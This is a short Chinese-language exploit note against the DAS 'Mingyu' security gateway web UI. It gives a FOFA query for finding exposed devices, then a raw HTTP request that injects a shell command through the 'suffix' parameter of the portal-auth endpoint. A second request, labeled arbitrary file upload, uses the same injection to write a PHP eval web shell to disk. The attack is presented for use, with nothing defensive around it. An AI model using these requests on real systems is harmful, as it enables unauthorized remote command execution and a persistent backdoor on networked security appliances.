FOFA：body="/webui/images/basic/login/" && title=="明御安全网关"

复现步骤
GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%7Burlenc(%60id+%3E/usr/local/webui/test.txt%60)%7D HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded

任意文件上传

GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1|echo+"<%3fphp+eval(\$_POST[\"a\"]);?>"+>+.xxx.php HTTP/1.1